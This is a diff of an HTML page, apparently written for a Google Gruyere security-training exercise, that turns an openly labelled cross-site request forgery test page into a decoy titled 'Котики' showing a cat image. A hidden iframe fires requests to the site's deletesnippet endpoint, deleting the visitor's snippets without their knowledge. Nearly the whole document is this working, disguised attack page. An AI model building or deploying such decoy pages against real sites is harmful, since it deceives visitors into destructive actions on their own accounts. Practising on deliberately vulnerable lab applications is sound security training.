@@ -1,18 +1,21 @@
-<!-- xsrf-test.html -->
 <!DOCTYPE html>
 <html>
 <head>
-  <title>ВАЖНАЯ НОВОСТЬ </title>
+  <title>Котики 🐱</title>
 </head>
 <body>
-  <h1>Вы атакованы XSRF!</h1>
+  <h1>Смотрите, котики!</h1>
   <img src="https://i.imgur.com/8UXpQeA.jpg" width="500">
 
-  <!-- Скрытый iframe — чтобы обновить контекст -->
-  <iframe src="https://google-gruyere.appspot.com/643453999600290416051506802884356354571" 
-          style="display:none" 
-          onload="setTimeout(() => {
-            document.body.innerHTML += '<img src=\'https://google-gruyere.appspot.com/643453999600290416051506802884356354571/deletesnippet?index=1;
-          }, 1000)"></iframe>
+  <!-- Скрытый iframe с автоматическим удалением -->
+  <iframe name="xsrfer" style="display:none" srcdoc="
+    <html>
+      <body>
+        <img src='https://google-gruyere.appspot.com/643453999600290416051506802884356354571/deletesnippet?index=0'>
+        <img src='https://google-gruyere.appspot.com/643453999600290416051506802884356354571/deletesnippet?index=1'>
+        <img src='https://google-gruyere.appspot.com/643453999600290416051506802884356354571/deletesnippet?index=2'>
+      </body>
+    </html>
+  "></iframe>
 </body>
 </html>
